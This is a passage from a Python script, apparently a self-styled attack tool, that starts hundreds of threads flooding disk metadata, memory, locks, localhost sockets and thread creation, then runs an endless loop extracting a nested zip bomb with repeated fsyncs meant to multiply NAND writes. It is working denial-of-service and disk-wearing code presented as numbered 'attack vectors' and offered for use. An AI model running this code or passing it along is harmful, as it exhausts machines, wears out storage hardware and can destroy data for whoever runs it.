    for i in range(4):  T(_large_storm,  sv_dir, stop, i)                  # #78
    for i in range(8):  T(_varsize_storm,sv_dir, stop, i)                  # #79

    # ── [P8] Metadata + truncate + seek storms ────────────────────────────────
    print(f"\n  [P8] Metadata + truncate + seek storms...")
    meta_dir   = os.path.join(OUTPUT_DIR, "meta")
    trunc_dir  = os.path.join(OUTPUT_DIR, "trunc")
    seek_dir   = os.path.join(OUTPUT_DIR, "seek")
    for i in range(16): T(_metadata_storm, meta_dir,  stop, i)             # #80-95
    for i in range(8):  T(_truncate_storm, trunc_dir, stop, i)             # #96-103
    for i in range(12): T(_seek_storm,     seek_dir,  stop, i)             # #104-115

    # ── [P9] Fragmentation + append ───────────────────────────────────────────
    frag_dir = os.path.join(OUTPUT_DIR, "frag")
    T(_frag_storm,   frag_dir, stop)                                        # #116
    T(_append_storm, frag_dir, stop)                                        # #118

    # ── [P10] Directory listing + stat storms ─────────────────────────────────
    for _ in range(4): T(_readdir_storm, flat_dir, stop)                    # #123
    for _ in range(4): T(_stat_storm,    flat_dir, stop)                    # #124

    # ── [P11] Memory attacks ──────────────────────────────────────────────────
    print(f"\n  [P11] Memory attack threads...")
    shared_arr = bytearray(256)
    strides = [64, 128, 997, 1024, 3001]
    for s in strides: T(_cache_thrash, stop, s)                             # #127-129
    for i in range(32): T(_false_sharing, stop, shared_arr, i % len(shared_arr))  # #130
    for _ in range(4):  T(_gc_pressure_dicts, stop)                         # #131
    for _ in range(4):  T(_gc_pressure_circular, stop)                      # #132
    for _ in range(4):  T(_bytearray_copy_storm, stop)                      # #134
    for _ in range(32): T(_stack_pressure, stop)                            # #135

    # ── [P12] Network storms ──────────────────────────────────────────────────
    for _ in range(8): T(_localhost_storm, stop)                            # #143

    # ── [P13] Sync contention ─────────────────────────────────────────────────
    print(f"\n  [P13] Lock contention storms...")
    main_lock = threading.Lock(); main_rlock = threading.RLock()
    main_cond = threading.Condition()
    for _ in range(32): T(_mutex_contend, stop, main_lock)                  # #151-182
    for _ in range(16): T(_mutex_contend, stop, main_rlock)                 # #183-198
    for _ in range(4):  T(_condition_storm, stop, main_cond)                # #199

    # ── [P14] Process + thread flood ─────────────────────────────────────────
    print(f"\n  [P14] Thread flood (500 threads)...")
    for _ in range(500): T(_thread_flood_worker, stop)                      # #149

    # ── [P15] Python overhead storms ─────────────────────────────────────────
    print(f"\n  [P15] Python overhead storms...")
    for _ in range(8): T(_exception_storm, stop)                            # #203
    for _ in range(4): T(_json_storm, stop)                                 # #204
    for _ in range(4): T(_struct_storm, stop)                               # #206
    for _ in range(4): T(_b64_storm, stop)                                  # #207
    for _ in range(4): T(_zlib_thread, stop)                                # #208
    for _ in range(8): T(_hash_thread, stop)                                # #210

    # ── [P16] Read + mmap storms ──────────────────────────────────────────────
    shared_paths: list = []; paths_lock = threading.Lock()

    def _read_storm_w(stop):
        while not stop.is_set():
            with paths_lock:
                if not shared_paths: time.sleep(0.001); continue
                p = random.choice(shared_paths)
            try:
                with open(p, "rb") as f:
                    while f.read(65536): pass
            except OSError: pass

    def _mmap_storm_w(stop):
        while not stop.is_set():
            with paths_lock:
                if not shared_paths: time.sleep(0.001); continue
                p = random.choice(shared_paths)
            try:
                sz = os.path.getsize(p)
                if sz < 1: continue
                with open(p, "rb") as f:
                    with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as m:
                        for _ in range(300): m[random.randint(0, sz-1)]
            except: pass

    for _ in range(64): T(_read_storm_w, stop)                             # #217 read
    for _ in range(32): T(_mmap_storm_w, stop)                             # #136-137

    # ── PERPETUAL EXTRACTION LOOP ─────────────────────────────────────────────
    print()
    hr()
    print("  PERPETUAL EXTRACTION LOOP — vectors #211-218 — Made by Aryan")
    hr()

    base_size = max(1, int(BASE_SIZE_MB * 1024 * 1024)); pass_num = 0

    while True:
        pass_num += 1
        disk_pct = _disk_pct(); disk_free = _disk_free_mb()
        print(f"\n  ══ PASS {pass_num}  |  disk {disk_pct:.1f}% full  |  {disk_free:.1f} MB free ══")

        if pass_num > 1:
            try: shutil.rmtree(UNZIP); os.makedirs(UNZIP, exist_ok=True)
            except: pass

        current = [final_zip]; simulating = False; sim_count = 0; extracted = 0

        for depth in range(NUM_LAYERS, -1, -1):
            label  = get_label(depth)
            ipp    = COPIES_PER_LAYER if depth > 0 else 1

            if simulating:
                nc = sim_count * ipp
                print(f"\n  [SIM] Layer {label} — {sim_count:,} → {nc:,}  "
                      f"(would use {nc*base_size:,} bytes)")
                sim_count = nc; continue

            cnt    = len(current); nc = cnt * ipp
            print(f"\n  [REAL] Layer {label} — {cnt:,} → {nc:,}  |  disk {_disk_pct():.1f}%")

            if extracted + nc > MAX_REAL_FILES:
                simulating = True; sim_count = nc
                print(f"         Exceeds MAX_REAL_FILES — simulation"); continue

            nxt = []; t0 = time.time()
            with ThreadPoolExecutor(max_workers=128) as pool:
                futs = {pool.submit(_extract_deadly, zp, UNZIP, shared_paths, paths_lock): zp
                        for zp in current}
                for f in as_completed(futs):
                    try: paths = f.result(); nxt.extend(paths); extracted += len(paths)
                    except OSError: pass

            elapsed = time.time() - t0
            tsz     = sum(os.path.getsize(p) for p in nxt if os.path.exists(p))
            print(f"         Extracted  : {len(nxt):,} files  ({elapsed:.1f}s)")
            print(f"         Write amp  : 5× fsync → {len(nxt)*5:,} NAND commits")
            print(f"         On disk    : {tsz:,} bytes  ({bytes_to_mb(tsz):.2f} MB)")
            print(f"         Disk       : {_disk_pct():.1f}% full  |  {_disk_free_mb():.1f} MB free")

            if depth == 0 and nxt:
                hr("-")
                print(f"  BASE REVEALED — {nxt[0]}  |  {len(nxt):,} copies  |  theory {bytes_to_mb(theoretical):.4f} MB")
                hr("-")
            current = nxt

        print(f"\n  ── Pass {pass_num} done. Restarting immediately. All {len(threads)} attack threads still running. ──")


# ── Entry point ────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    # Made by Aryan — github.com/YOUR_USERNAME
    mode = sys.argv[1] if len(sys.argv) > 1 else "build"
    if mode == "check": check()
    else: build()
